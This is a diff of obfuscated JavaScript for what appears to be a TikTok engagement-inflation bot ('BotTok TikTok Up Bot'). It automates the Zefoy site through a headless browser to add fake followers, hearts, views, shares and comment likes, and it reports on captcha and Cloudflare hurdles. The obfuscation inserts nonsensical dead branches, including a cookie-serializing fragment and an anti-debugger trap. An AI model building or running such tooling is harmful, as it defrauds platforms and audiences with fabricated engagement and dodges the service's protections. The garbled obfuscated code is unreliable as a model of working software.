+            v198.maofk(v202, "SESSID: " + v204);
           } else {
-            await v198.cAfcN(f6, false, p420);
+            await v198.saydw(f6, false, p430);
             return;
           }
         }
-        if (v198.aDcNV(v90, v198.AxmSk)) {
-          if (v198.ggXwj(v198.qlYvJ, v198.qlYvJ)) {
-            const v206 = v204.find(p464 => p464.name === v206.name);
-            return v198.bZxxD(v206, v198);
-          } else {
-            await v198.fLKEa(f63, false, p420);
+        if (v198.SSVmC(v90, v198.AdXCH)) {
+          if (v198.DynUP(v198.VKHEC, v198.TsvJg)) {
+            await v198.SmgWc(f64, false, p430);
             return;
+          } else {
+            const v206 = v198.EXWDr(v198.npxPc(v204), 60);
+            const v207 = v198.EXWDr(p430, v206);
+            return v198.round(v207);
           }
         }
       } else {
-        v204 = v198.MBYaM(p420, v198);
+        v198.stdout.clearLine(0);
+        z.stdout.cursorTo(0);
+        w.stdout.write(A + " Captcha resolved! (" + p + ")");
       }
-    } else if (v198.gSjtU(v198.RwMaW, v198.RwMaW)) {
-      v198.RssKW(v202, v204);
+    } else if (v198.DynUP(v198.BIRJf, v198.BIRJf)) {
+      if (!v198) {
+        v200.stdout.clearLine(0);
+        v201.stdout.cursorTo(0);
+        v202.stdout.write(v198.JcgFP(v203, v198.eSRbW));
+      }
     } else {
-      return await v198.bBTYG(f20);
+      return await v198.npxPc(f20);
     }
+  } else {
+    const [, v208, v209, v210, v211, v212] = z;
+    return {
+      diggCount: v198.maofk(w, v208),
+      shareCount: v198.HAvmG(A, v209),
+      commentCount: v198.HAvmG(p, v210),
+      playCount: v198.HAvmG(C, v211),
+      collectCount: v198.HAvmG(J, v212)
+    };
   }
 }
 async function f19() {
-  const v207 = {
-    TAOSh: "You are being rate limited",
-    ZtjZn: function (p465, p466) {
-      return p465 !== p466;
+  const v213 = {
+    dRwdB: "[36m",
+    hPTax: "[0m",
+    fCWlp: function (p465, p466) {
+      return p465 === p466;
     },
-    ElxSV: "CYRji",
-    MWpYF: function (p467, p468) {
+    pcVZa: "XrUCo",
+    qjOyu: "RYLxh",
+    XzlWa: function (p467, p468) {
       return p467(p468);
     },
-    nKLlj: function (p469) {
+    gffXM: function (p469) {
       return p469();
     },
-    sNuOC: "Back",
-    EDjRY: "list",
-    eoyLp: "url",
-    YmQIE: "Select a video from the history",
-    mlEvD: function (p470, p471) {
+    DjGiP: "Back",
+    tltaW: "list",
+    TCMEH: "url",
+    pBQGy: "Select a video from the history",
+    FDtHW: function (p470, p471) {
       return p470 === p471;
     },
-    XekTm: "BrGjG",
-    SyYzv: "irKSq",
-    tWFRh: function (p472) {
-      return p472();
-    }
+    Sacnq: "vHZTo",
+    aOPBP: "FiqLd",
+    lNAZm: function (p472, p473) {
+      return p472 !== p473;
+    },
+    cexsR: "xbpXF",
+    dpbDN: "QkqIA"
   };
-  let v208 = await v207.nKLlj(f33);
-  v208 = v208.map(p473 => {
-    if (v207.ZtjZn(v207.ElxSV, v207.ElxSV)) {
-      v211 = v207.TAOSh;
+  let v214 = await v213.gffXM(f34);
+  v214 = v214.map(p474 => {
+    if (v213.fCWlp(v213.pcVZa, v213.qjOyu)) {
+      v213.log(v213.dRwdB, "                                                          \nBotTok " + v214 + " TikTok Up Bot (by @DevMHOne)    Exit: [CTRL+C] \n", v213.hPTax);
     } else {
-      const v209 = {
-        name: p473.url
+      const v215 = {
+        name: p474.url
       };
-      return v209;
+      return v215;
     }
   });
-  const v210 = {
-    name: v207.sNuOC
+  const v216 = {
+    name: v213.DjGiP
   };
-  v208.push(v210);
-  const v211 = {
-    type: v207.EDjRY,
-    name: v207.eoyLp,
-    message: v207.YmQIE,
-    choices: v208
+  v214.push(v216);
+  const v217 = {
+    type: v213.tltaW,
+    name: v213.TCMEH,
+    message: v213.pBQGy,
+    choices: v214
   };
-  const v212 = await a0zv.prompt([v211]);
-  if (v207.mlEvD(await v212.url, v207.sNuOC)) {
-    if (v207.ZtjZn(v207.XekTm, v207.XekTm)) {
-      v207.MWpYF(v211, "Zefoy is protected by UAM Cloudflare!");
+  const v218 = await a0iH.prompt([v217]);
+  if (v213.FDtHW(await v218.url, v213.DjGiP)) {
+    if (v213.fCWlp(v213.Sacnq, v213.aOPBP)) {
+      v213.XzlWa(v217, "Zefoy is protected by UAM Cloudflare!");
     } else {
-      if (!v26) {
-        if (v207.mlEvD(v207.SyYzv, v207.SyYzv)) {
+      if (!v28) {
+        if (v213.lNAZm(v213.cexsR, v213.dpbDN)) {
           process.stdout.moveCursor(0, -2);
           process.stdout.clearScreenDown();
         } else {
-          v207 = v208;
+          return v217[0].word;
         }
       }
-      return await v207.tWFRh(f18);
+      return await v213.gffXM(f18);
     }
   }
-  return v212.url;
+  return v218.url;
 }
 async function f20() {
-  const v213 = {
-    AuWYA: "[36m",
-    spNqr: "[0m",
-    juoMO: "input",
-    tHoHB: "url",
-    lyYxx: "What is the URL of your Tiktok video?",
-    LByiz: function (p474, p475) {
-      return p474 === p475;
+  const v219 = {
+    jjNlz: function (p475, p476) {
+      return p475(p476);
     },
-    TgauN: function (p476, p477) {
-      return p476 === p477;
+    YISfO: "input",
+    zXCCy: "url",
+    lAHYs: "What is the URL of your Tiktok video?",
+    CSEzY: function (p477, p478) {
+      return p477 === p478;
     },
-    aRtkO: "gMPKo",
-    VptSr: "eQtHq",
-    FvmJm: function (p478, p479) {
-      return p478 === p479;
+    TvSfb: function (p479, p480) {
+      return p479 !== p480;
     },
-    DxdDc: "UTkLG",
-    uGoDT: function (p480) {
-      return p480();
+    ySucY: "JlxGC",
+    hLDQI: function (p481, p482) {
+      return p481 !== p482;
     },
-    xNltn: "vqubt",
-    XSbOX: "iyHaj",
-    gueQK: function (p481) {
-      return p481();
+    nMyLr: "WahBW",
+    KiOft: function (p483) {
+      return p483();
     },
-    pmlsR: function (p482, p483) {
-      return p482 === p483;
+    wfCOT: "oOroU",
+    ydkpG: function (p484, p485) {
+      return p484 !== p485;
     },
-    DCbYE: "qdpYW",
-    TahNJ: "albkr",
-    QxyiR: function (p484, p485) {
-      return p484(p485);
-    }
+    rxTiV: "sGAiZ"
   };
-  const v214 = {
-    type: v213.juoMO,
-    name: v213.tHoHB,
-    message: v213.lyYxx
+  const v220 = {
+    type: v219.YISfO,
+    name: v219.zXCCy,
+    message: v219.lAHYs
   };
-  const v215 = await a0zv.prompt([v214]);
-  const v216 = v215.url;
-  if (v213.LByiz(v216, "")) {
-    if (v213.TgauN(v213.aRtkO, v213.VptSr)) {
-      v214.log(v213.AuWYA, "                                                          \nBotTok " + v215 + " TikTok Up Bot (by @DevMHOne)    Exit: [CTRL+C] \n", v213.spNqr);
+  const v221 = await a0iH.prompt([v220]);
+  const v222 = v221.url;
+  if (v219.CSEzY(v222, "")) {
+    if (v219.TvSfb(v219.ySucY, v219.ySucY)) {
+      v219.jjNlz(v220, v221);
+      return null;
     } else {
-      if (!v26) {
-        if (v213.FvmJm(v213.DxdDc, v213.DxdDc)) {
+      if (!v28) {
+        if (v219.hLDQI(v219.nMyLr, v219.nMyLr)) {
+          return [];
+        } else {
           process.stdout.moveCursor(0, -2);
           process.stdout.clearScreenDown();
-        } else {
-          return null;
         }
       }
-      return await v213.uGoDT(f18);
+      return await v219.KiOft(f18);
     }
-  } else if (v213.TgauN(v213.xNltn, v213.XSbOX)) {
-    v214 = "Extracting comments (" + v215.length + ")...";
+  } else if (v219.hLDQI(v219.wfCOT, v219.wfCOT)) {
+    v220.stdout.moveCursor(0, -2);
+    v221.stdout.clearScreenDown();
   } else {
-    let v217 = await v213.gueQK(f33);
-    if (!v217.some(p486 => p486.url === v216)) {
-      if (v213.pmlsR(v213.DCbYE, v213.TahNJ)) {
-        v213 = true;
+    let v223 = await v219.KiOft(f34);
+    if (!v223.some(p486 => p486.url === v222)) {
+      if (v219.ydkpG(v219.rxTiV, v219.rxTiV)) {
+        if (v222) {
+          const v224 = v223.apply(p, arguments);
+          v224 = null;
+          return v224;
+        }
       } else {
-        v217.push({
-          url: v216,
+        v223.push({
+          url: v222,
           timestamp: new Date().getTime()
         });
-        await v213.QxyiR(f32, v217);
+        await v219.jjNlz(f33, v223);
       }
     }
-    return v216;
+    return v222;
   }
 }
 function f21(p487) {
-  const v218 = {
-    JZZEn: function (p488, p489) {
+  const v225 = {
+    kkhFv: function (p488, p489) {
       return p488 !== p489;
     },
-    eXSkH: "lgjYq",
-    DvFGm: "BEVOa",
-    eickL: function (p490, p491) {
+    WwVEf: "tFLTX",
+    YSHns: function (p490, p491) {
       return p490(p491);
     }
   };
-  const v219 = /@(\w+)\n(.+)\n(\d+\s\w+\sago)\n([\d|\,]+)/g;
-  const v220 = [...p487.matchAll(v219)];
-  return v220.map(p492 => {
-    if (v218.JZZEn(v218.eXSkH, v218.DvFGm)) {
+  const v226 = /@(\w+)\n(.+)\n(\d+\s\w+\sago)\n([\d|\,]+)/g;
+  const v227 = [...p487.matchAll(v226)];
+  return v227.map(p492 => {
+    if (v225.kkhFv(v225.WwVEf, v225.WwVEf)) {
+      v226 = v227.concat;
+    } else {
       return {
         username: p492[1],
         comment: p492[2],
         timestamp: p492[3],
-        likes: v218.eickL(parseInt, p492[4].replace(/[,\.]/g, "")),
+        likes: v225.YSHns(parseInt, p492[4].replace(/[,\.]/g, "")),
         concat: "@" + p492[1] + " \"" + p492[2].substring(0, 10) + "...\" " + p492[3] + " (" + p492[4] + ")"
       };
-    } else {
-      v219 = "[32m+" + v220 + "[0m";
     }
   });
 }
 async function f22(p493) {
-  const v221 = {
-    jCUPr: function (p494, p495) {
-      return p494 + p495;
+  const v228 = {
+    HWdqJ: function (p494, p495) {
+      return p494 !== p495;
     },
-    ELHHs: "debu",
-    undhc: "gger",
-    cYwuK: "stateObject",
-    ivQEd: function (p496, p497) {
+    VtrFD: "ItSeM",
+    FkCyL: "Back",
+    IliwJ: "list",
+    hIhHn: "concat",
+    SMHDY: "Select a comment",
+    RvQHU: function (p496, p497) {
       return p496 === p497;
     },
-    mVkFm: "mzWQX",
-    tFywK: "Back",
-    DIgdB: "list",
-    iYHBM: "concat",
-    IngLJ: "Select a comment",
-    mQRBm: function (p498, p499) {
-      return p498 === p499;
-    },
-    myiST: "Krqnw",
-    UvmoT: "HdaQS",
-    Whklk: function (p500, p501) {
-      return p500 !== p501;
-    },
-    JrinJ: "JDqRh",
-    mASsK: function (p502) {
-      return p502();
+    xYABG: "GRWSP",
+    BBbmX: "CAtZB",
+    CSFrd: "Crxri",
+    nSesN: function (p498) {
+      return p498();
     }
   };
-  let v222 = p493.map(p503 => {
-    if (v221.ivQEd(v221.mVkFm, v221.mVkFm)) {
-      const v223 = {
-        name: p503.concat
-      };
-      return v223;
-    } else {
-      (function () {
-        return false;
-      }).constructor(lyhgTE.jCUPr(lyhgTE.ELHHs, lyhgTE.undhc)).apply(lyhgTE.cYwuK);
-    }
-  });
-  const v224 = {
-    name: v221.tFywK
-  };
-  v222.push(v224);
-  const v225 = {
-    type: v221.DIgdB,
-    name: v221.iYHBM,
-    message: v221.IngLJ,
-    choices: v222
-  };
-  const v226 = await a0zv.prompt([v225]);
-  if (v221.mQRBm(await v226.concat, v221.tFywK)) {
-    if (v221.mQRBm(v221.myiST, v221.UvmoT)) {
-      v225.log("Cloudflare Expired / Freer Expired");
+  let v229 = p493.map(p499 => {
+    if (v228.HWdqJ(v228.VtrFD, v228.VtrFD)) {
       return false;
     } else {
-      if (!v26) {
-        if (v221.Whklk(v221.JrinJ, v221.JrinJ)) {
-          p493 = v221;
+      const v230 = {
+        name: p499.concat
+      };
+      return v230;
+    }
+  });
+  const v231 = {
+    name: v228.FkCyL
+  };
+  v229.push(v231);
+  const v232 = {
+    type: v228.IliwJ,
+    name: v228.hIhHn,
+    message: v228.SMHDY,
+    choices: v229
+  };
+  const v233 = await a0iH.prompt([v232]);
+  if (v228.RvQHU(await v233.concat, v228.FkCyL)) {
+    if (v228.RvQHU(v228.xYABG, v228.xYABG)) {
+      if (!v28) {
+        if (v228.HWdqJ(v228.BBbmX, v228.CSFrd)) {
+          process.stdout.moveCursor(0, -6);
+          process.stdout.clearScreenDown();
+        } else {
+          p493 = v228.slice(0, 32);
+        }
+      }
+      await v228.nSesN(f2);
+      return;
+    } else {
+      return null;
+    }
+  }
+  return v229.findIndex(p500 => p500.name === v233.concat);
+}
+async function f23() {
+  const v234 = {
+    JHYPi: function (p501, p502) {
+      return p501 !== p502;
+    },
+    OvdEx: "oGIOz",
+    LLXdU: "yjZqz",
+    KmxRf: "Back",
+    NHhSS: "list",
+    hxYDv: "commentHeartsQty",
+    AwFEZ: "Select hearts per cycle",
+    pMyAQ: function (p503, p504) {
+      return p503 === p504;
+    },
+    jidWX: function (p505, p506) {
+      return p505 === p506;
+    },
+    txqLK: "zEPle",
+    UMIEg: "VgbBy",
+    uVxXJ: function (p507) {
+      return p507();
+    }
+  };
+  let v235 = v88.map(p508 => {
+    if (v234.JHYPi(v234.OvdEx, v234.LLXdU)) {
+      const v236 = {
+        name: p508
+      };
+      return v236;
+    } else {
+      return v234.stringify(v235.cookies.map(p509 => ({
+        domain: p509.domain,
+        expirationDate: p509.expires,
+        hostOnly: p509.hostOnly,
+        httpOnly: p509.httpOnly,
+        name: p509.name,
+        path: p509.path,
+        sameSite: "unspecified",
+        secure: p509.secure,
+        session: p509.session,
+        storeId: "0",
+        value: p509.value
+      })));
+    }
+  });
+  const v237 = {
+    name: v234.KmxRf
+  };
+  v235.push(v237);
+  const v238 = {
+    type: v234.NHhSS,
+    name: v234.hxYDv,
+    message: v234.AwFEZ,
+    choices: v235
+  };
+  const v239 = await a0iH.prompt([v238]);
+  if (v234.pMyAQ(await v239.commentHeartsQty, v234.KmxRf)) {
+    if (v234.jidWX(v234.txqLK, v234.txqLK)) {
+      if (!v28) {
+        if (v234.JHYPi(v234.UMIEg, v234.UMIEg)) {
+          return v238.task;
         } else {
           process.stdout.moveCursor(0, -6);
           process.stdout.clearScreenDown();
         }
       }
-      await v221.mASsK(f2);
+      await v234.uVxXJ(f2);
       return;
+    } else {
+      v237.stdout.clearLine(0);
+      v238.stdout.cursorTo(0);
+      v239.stdout.write(w + " Stopped for reaching the maximum time limit!");
     }
   }
-  return v222.findIndex(p504 => p504.name === v226.concat);
+  return v239.commentHeartsQty;
 }
-async function f23(p505, p506, p507, p508 = false) {
-  const v227 = {
-    nOOBk: function (p509, p510) {
-      return p509(p510);
+async function f24(p510, p511, p512, p513 = false) {
+  const v240 = {
+    Olkib: function (p514, p515) {
+      return p514 < p515;
     },
-    hWVDN: function (p511) {
-      return p511();
+    UtZIh: function (p516, p517) {
+      return p516 + p517;
     },
-    eXKke: function (p512, p513) {
-      return p512 !== p513;
+    jFLLm: function (p518, p519) {
+      return p518 === p519;
     },
-    hgjpc: "IeVux",
-    PSAzm: function (p514, p515) {
-      return p514(p515);
+    RoNze: "sRtlU",
+    pfqXx: function (p520, p521) {
+      return p520(p521);
     },
-    fnkcP: function (p516, p517) {
-      return p516(p517);
-    },
-    aqVzF: "Up Followers",
-    UVWtk: ".t-followers-button",
-    XqOUK: ".t-followers-menu",
-    VGpvn: "Up Hearts",
-    YZmDK: ".t-hearts-button",
-    JxmQr: ".t-hearts-menu",
-    vMSFR: "Up Comments Hearts",
-    TUspM: ".t-chearts-button",
-    majQm: ".t-chearts-menu",
-    WNGAd: "Up Views",
-    Majty: ".t-views-button",
-    ZJXiS: ".t-views-menu",
-    OtEif: "Up Shares",
-    XhpzP: ".t-shares-button",
-    bmmkH: ".t-shares-menu",
-    IivsU: "Up Favorites",
-    PTZaI: ".t-favorites-button",
-    QRyHt: ".t-favorites-menu",
-    LEuvr: "Up Livestream [VS+LIKES]",
-    VtPOk: ".t-livestream-button",
-    pnGiq: ".t-livestream-menu",
-    JupvV: "QuioH",
-    HoZOe: "cSPTk",
-    OsqZJ: function (p518, p519) {
-      return p518 && p519;
-    },
-    uuuHs: function (p520, p521) {
-      return p520 === p521;
-    },
-    XGMFd: "fumRS",
-    TxTMV: "xUkqz",
-    ylczK: function (p522, p523) {
+    sWIPc: function (p522, p523) {
       return p522(p523);
     },
-    tlGKM: function (p524, p525, p526, p527, p528) {
-      return p524(p525, p526, p527, p528);
+    lNgQg: "Up Followers",
+    MxeqS: ".t-followers-button",
+    KUowg: ".t-followers-menu",
+    MaZlS: "Up Hearts",
+    lSKxE: ".t-hearts-button",
+    xTbkQ: ".t-hearts-menu",
+    YOMtM: "Up Comments Hearts",
+    zSaob: ".t-chearts-button",
+    NFyiW: ".t-chearts-menu",
+    Ljmto: "Up Views",
+    wkMLH: ".t-views-button",
+    sxEkz: ".t-views-menu",
+    GgSMB: "Up Shares",
+    PvNvd: ".t-shares-button",
+    YEsfi: ".t-shares-menu",
+    DNqtY: "Up Favorites",
+    Ujhdk: ".t-favorites-button",
+    udfLP: ".t-favorites-menu",
+    wrasV: "Up Livestream [VS+LIKES]",
+    sKXET: ".t-livestream-button",
+    ckQGT: ".t-livestream-menu",
+    fMKgp: function (p524, p525) {
+      return p524 !== p525;
     },
-    EhQrq: function (p529, p530, p531) {
-      return p529(p530, p531);
+    sZquP: "juIJj",
+    QwLQS: "ZAHXu",
+    LEMze: function (p526, p527) {
+      return p526 && p527;
     },
-    GjRVS: function (p532, p533, p534, p535, p536) {
-      return p532(p533, p534, p535, p536);
+    SQVYC: function (p528, p529) {
+      return p528 !== p529;
     },
-    OYSFf: function (p537, p538) {
-      return p537 !== p538;
+    QrSbu: "IxiLc",
+    QKzLC: function (p530, p531, p532, p533, p534) {
+      return p530(p531, p532, p533, p534);
     },
-    mcHzh: "kWLtl",
-    DCfzQ: "OEJHc",
-    BfpIA: "2|3|1|5|6|0|4",
-    UHWPm: function (p539) {
-      return p539();
+    eYbUS: function (p535, p536, p537) {
+      return p535(p536, p537);
     },
-    ijGLl: function (p540, p541) {
-      return p540(p541);
+    MRcyq: "pWFXf",
+    YakcD: "6|5|1|4|0|2|3",
+    ywPOd: function (p538, p539) {
+      return p538(p539);
+    },
+    CxCUx: function (p540) {
+      return p540();
+    },
+    sHGao: function (p541, p542) {
+      return p541(p542);
     }
   };
   try {
-    if (v227.eXKke(v227.hgjpc, v227.hgjpc)) {
-      p506 = p507.slice(0, 32);
-    } else {
-      v227.PSAzm(clearInterval, v70);
-      v227.fnkcP(clearInterval, v71);
-      v227.fnkcP(clearInterval, v72);
-      v69 = v69 || process.hrtime();
-      const v228 = new Map([[v227.aqVzF, [v227.UVWtk, v227.XqOUK]], [v227.VGpvn, [v227.YZmDK, v227.JxmQr]], [v227.vMSFR, [v227.TUspM, v227.majQm]], [v227.WNGAd, [v227.Majty, v227.ZJXiS]], [v227.OtEif, [v227.XhpzP, v227.bmmkH]], [v227.IivsU, [v227.PTZaI, v227.QRyHt]], [v227.LEuvr, [v227.VtPOk, v227.pnGiq]]]);
-      let v231 = v227.Majty;
-      let v232 = v227.ZJXiS;
-      if (v228.has(p505)) {
-        if (v227.eXKke(v227.JupvV, v227.HoZOe)) {
-          [v231, v232] = v228.get(p505);
+    if (v240.jFLLm(v240.RoNze, v240.RoNze)) {
+      v240.pfqXx(clearInterval, v68);
+      v240.sWIPc(clearInterval, v69);
+      v240.sWIPc(clearInterval, v70);
+      v67 = v67 || process.hrtime();
+      const v241 = new Map([[v240.lNgQg, [v240.MxeqS, v240.KUowg]], [v240.MaZlS, [v240.lSKxE, v240.xTbkQ]], [v240.YOMtM, [v240.zSaob, v240.NFyiW]], [v240.Ljmto, [v240.wkMLH, v240.sxEkz]], [v240.GgSMB, [v240.PvNvd, v240.YEsfi]], [v240.DNqtY, [v240.Ujhdk, v240.udfLP]], [v240.wrasV, [v240.sKXET, v240.ckQGT]]]);
+      let v244 = v240.wkMLH;
+      let v245 = v240.sxEkz;
+      if (v241.has(p510)) {
+        if (v240.fMKgp(v240.sZquP, v240.QwLQS)) {
+          [v244, v245] = v241.get(p510);
         } else {
-          p506.stdout.moveCursor(0, -4);
-          p507.stdout.clearScreenDown();
+          return null;
         }
       }
-      await p507.evaluate("(() => {\n        document.querySelector(\"" + v231 + "\").click();\n      })();");
-      await p507.waitForSelector(v232);
-      await p507.$eval(v232 + " > div > form > div > input", (p542, p543) => p542.value = p543, p506);
-      await p507.evaluate("(() => {\n        document\n          .querySelector(\"" + v232 + " > div > form > div > div > button\")\n          .click();\n      })();");
-      if (v227.OsqZJ(!p508, !v26)) {
-        if (v227.uuuHs(v227.XGMFd, v227.TxTMV)) {
-          v227.nOOBk(B, "[" + r + "] " + J + " (+" + A + ") [" + F + "] Stopped for reaching the maximum time limit! (in " + v227.hWVDN(p) + " mins)");
-          if (!h) {
-            W.stdout.clearLine(0);
-            R.stdout.cursorTo(0);
-            o.stdout.write(E + " Stopped for reaching the maximum time limit!");
-          }
-          u.exit(0);
+      await p512.evaluate("(() => {\n        document.querySelector(\"" + v244 + "\").click();\n      })();");
+      await p512.waitForSelector(v245);
+      await p512.$eval(v245 + " > div > form > div > input", (p543, p544) => p543.value = p544, p511);
+      await p512.evaluate("(() => {\n        document\n          .querySelector(\"" + v245 + " > div > form > div > div > button\")\n          .click();\n      })();");
+      if (v240.LEMze(!p513, !v28)) {
+        if (v240.SQVYC(v240.QrSbu, v240.QrSbu)) {
+          v240.stdout.clearLine(0);
+          v241.stdout.cursorTo(0);
+          v244.stdout.write(v245 + " Captcha resolved! (" + p + ")");
         } else {
           console.log("\n\n");
         }
       }
-      v227.ylczK(f53, p505 + " task running...");
-      v70 = await v227.tlGKM(f25, p507, v232, p505, p506);
-      v71 = await v227.EhQrq(f26, p507, v232);
-      v72 = await v227.GjRVS(f24, p507, v232, p505, p506);
+      v240.pfqXx(f54, p510 + " task running...");
+      v68 = await v240.QKzLC(f26, p512, v245, p510, p511);
+      v69 = await v240.eYbUS(f27, p512, v245);
+      v70 = await v240.QKzLC(f25, p512, v245, p510, p511);
+    } else {
+      p513.stdout.clearLine(0);
+      v240.stdout.cursorTo(0);
+      z.stdout.write(w + " Zefoy is unreachable or blocked! :(");
     }
-  } catch (B) {
-    if (v227.OYSFf(v227.mcHzh, v227.DCfzQ)) {
-      const v233 = v227.BfpIA.split("|");
-      let v234 = 0;
+  } catch (D) {
+    if (v240.fMKgp(v240.MRcyq, v240.MRcyq)) {
+      if (v240.Olkib(v240.UtZIh(C, 1), J.length)) {
+        let v246 = y[R];
+        e[h] = B[v240.UtZIh(v, 1)];
+        G[v240.UtZIh(Y, 1)] = v246;
+      }
+    } else {
+      const v247 = v240.YakcD.split("|");
+      let v248 = 0;
       while (true) {
-        switch (v233[v234++]) {
+        switch (v247[v248++]) {
           case "0":
-            v227.tlGKM(f23, p505, p506, p507, true);
-            continue;
-          case "1":
-            await v227.PSAzm(f52, 2000);
-            continue;
-          case "2":
-            v227.ylczK(f53, B);
-            continue;
-          case "3":
-            await v227.UHWPm(f30);
-            continue;
-          case "4":
-            return;
-          case "5":
-            p507 = await v227.ijGLl(f9, p507);
-            continue;
-          case "6":
-            await p507.goto(v92, {
+            await p512.goto(v92, {
               timeout: 0
             });
+            continue;
+          case "1":
+            await v240.pfqXx(f53, 2000);
+            continue;
+          case "2":
+            v240.QKzLC(f24, p510, p511, p512, true);
+            continue;
+          case "3":
+            return;
+          case "4":
+            p512 = await v240.ywPOd(f9, p512);
+            continue;
+          case "5":
+            await v240.CxCUx(f31);
+            continue;
+          case "6":
+            v240.sHGao(f54, D);
             continue;
         }
         break;
       }
-    } else {
-      return [];
     }
   }
 }
-async function f24(p544, p545, p546, p547) {
-  const v236 = {
-    Kijvu: function (p548, p549) {
-      return p548 + p549;
+async function f25(p545, p546, p547, p548) {
+  const v250 = {
+    pZqjj: function (p549, p550) {
+      return p549 - p550;
     },
-    fkSVx: " LICENSE IS VERIFIED!",
-    pOLOv: "No comments found",
-    pAXwE: function (p550, p551) {
-      return p550(p551);
+    ECqkX: function (p551, p552) {
+      return p551(p552);
     },
-    BYfpp: function (p552, p553) {
-      return p552 + p553;
+    kxZiD: function (p553) {
+      return p553();
     },
-    bvdFZ: function (p554, p555) {
-      return p554 + p555;
+    iSfyM: function (p554, p555) {
+      return p554 - p555;
     },
-    zKMlv: function (p556, p557) {
+    QaOMA: function (p556, p557) {
       return p556 !== p557;
     },
-    HBSMQ: "lKeKe",
-    nbDQE: "ojNVf",
-    HTAHO: "jrhsW",
-    JxtjU: "MVvZY",
-    eQGnc: function (p558, p559) {
-      return p558 === p559;
+    OjgAg: "nwMjs",
+    jLDIv: "YQslb",
+    JrevT: function (p558, p559) {
+      return p558 !== p559;
     },
-    sbVFh: "khtpB",
-    gSeHc: "qYFXT",
-    puvhk: "RgDdK",
-    UjQnS: "AiZAE",
-    fVDcP: function (p560, p561) {
-      return p560(p561);
+    JflLT: "goOPV",
+    EPiOu: function (p560, p561) {
+      return p560 === p561;
     },
-    dlshv: function (p562, p563) {
-      return p562(p563);
+    gwCBu: "kdmyj",
+    OFyva: "JtSyL",
+    YNBJb: "No comments found",
+    IYQuG: function (p562, p563) {
+      return p562 !== p563;
     },
-    UwCHn: function (p564, p565) {
-      return p564 > p565;
+    LyWvN: "DBcLD",
+    jLyeI: "...",
+    ocHER: function (p564, p565) {
+      return p564 !== p565;
     },
-    XGIvS: function (p566, p567) {
-      return p566 === p567;
+    Qgvvt: "gxpit",
+    FKJif: function (p566, p567) {
+      return p566(p567);
     },
-    NXBjH: "fQxDv",
-    lIjOH: "wgaOf",
-    BzTll: function (p568, p569) {
-      return p568 !== p569;
+    mAfcV: function (p568, p569) {
+      return p568(p569);
     },
-    JFNCJ: "zPmpa",
-    pdejm: "JjzKI",
-    tAZWc: function (p570) {
-      return p570();
+    xkcvM: function (p570, p571) {
+      return p570 > p571;
     },
-    URLQv: "KJBBg",
-    ZBQzN: "kTJDC",
-    Upomg: "tGyhR",
-    Rtfpr: function (p571) {
-      return p571();
+    nrudv: function (p572, p573) {
+      return p572 === p573;
     },
-    rABpy: function (p572, p573) {
-      return p572 / p573;
+    RoUZR: "HmRBV",
+    ovrhi: function (p574, p575) {
+      return p574 !== p575;
     },
-    NxIZB: function (p574) {
-      return p574();
+    epyWY: "ndddX",
+    uGqFP: function (p576, p577) {
+      return p576 === p577;
     },
-    RiHbt: function (p575, p576) {
-      return p575 * p576;
+    eaoTZ: "XKWQN",
+    NPGbK: function (p578, p579) {
+      return p578 === p579;
     },
-    gQkSQ: function (p577, p578) {
-      return p577 !== p578;
+    vMmQR: "PseJF",
+    lruhD: "yVlcx",
+    NvEDq: function (p580, p581) {
+      return p580 === p581;
     },
-    QTXIS: "nPPYH",
-    sAlJy: function (p579, p580) {
-      return p579 / p580;
+    MqgNf: "QEHeg",
+    TCnhr: function (p582) {
+      return p582();
     },
-    XTnjm: function (p581) {
-      return p581();
+    SFbgu: function (p583, p584) {
+      return p583 / p584;
     },
-    xjdBU: function (p582, p583) {
-      return p582(p583);
+    WpnVR: function (p585, p586) {
+      return p585(p586);
     },
-    aZhOX: function (p584, p585, p586, p587, p588) {
-      return p584(p585, p586, p587, p588);
+    TUEoI: function (p587, p588) {
+      return p587 * p588;
     },
-    TnMmh: function (p589, p590, p591) {
-      return p589(p590, p591);
+    XvXKO: function (p589, p590) {
+      return p589 === p590;
+    },
+    HLAwV: "LECrc",
+    VqDKD: function (p591) {
+      return p591();
+    },
+    WZQsh: function (p592, p593, p594, p595, p596) {
+      return p592(p593, p594, p595, p596);
+    },
+    zBOUD: function (p597, p598, p599) {
+      return p597(p598, p599);
     }
   };
-  return v236.TnMmh(setInterval, async () => {
-    const v237 = {
-      ntuuO: function (p592, p593) {
-        return v236.BYfpp(p592, p593);
+  return v250.zBOUD(setInterval, async () => {
+    const v251 = {
+      XXPRf: function (p600, p601) {
+        return v250.ECqkX(p600, p601);
       },
-      TIoLv: function (p594, p595) {
-        return v236.bvdFZ(p594, p595);
+      dJzQY: function (p602, p603) {
+        return v250.iSfyM(p602, p603);
       },
-      dhbQF: v236.fkSVx
+      NVReu: function (p604) {
+        return v250.kxZiD(p604);
+      }
     };
-    if (v236.zKMlv(v236.HBSMQ, v236.nbDQE)) {
-      let v238 = await p544.evaluate("(() => {\n        return document.querySelector(\"" + p545 + " > div > div\").innerText;\n      })();");
-      if (/1\s+2\s+3\s+/.test(v238)) {
-        if (v236.zKMlv(v236.HTAHO, v236.JxtjU)) {
-          v238 = "";
+    if (v250.QaOMA(v250.OjgAg, v250.jLDIv)) {
+      let v252 = await p545.evaluate("(() => {\n        return document.querySelector(\"" + p546 + " > div > div\").innerText;\n      })();");
+      if (/1\s+2\s+3\s+/.test(v252)) {
+        if (v250.JrevT(v250.JflLT, v250.JflLT)) {
+          v251.XXPRf(p546, "Do not use proxy!");
         } else {
-          v236.stdout.clearLine(0);
-          v237.stdout.cursorTo(0);
-          v238.stdout.write(v239 + " Stopped for reaching the maximum time limit!");
+          v252 = "";
         }
       }
-      let v239 = await p544.evaluate("(() => {\n        const element = document.querySelector('span.text-black.h6.text-danger');\n        if (element && element.textContent.trim() === 'No an comment found.') {\n          return true;\n        }\n        return false;\n      })();");
-      if (v239) {
-        if (v236.eQGnc(v236.sbVFh, v236.gSeHc)) {
-          p546 = "[32m+" + p547 + "[0m";
+      let v253 = await p545.evaluate("(() => {\n        const element = document.querySelector('span.text-black.h6.text-danger');\n        if (element && element.textContent.trim() === 'No an comment found.') {\n          return true;\n        }\n        return false;\n      })();");
+      if (v253) {
+        if (v250.EPiOu(v250.gwCBu, v250.OFyva)) {
+          p547.stdout.clearLine(0);
+          p548.stdout.cursorTo(0);
         } else {
-          v238 = v236.pOLOv;
+          v252 = v250.YNBJb;
         }
       }
-      v238 = v238.replace(/(\r\n|\n|\r)/gm, " ");
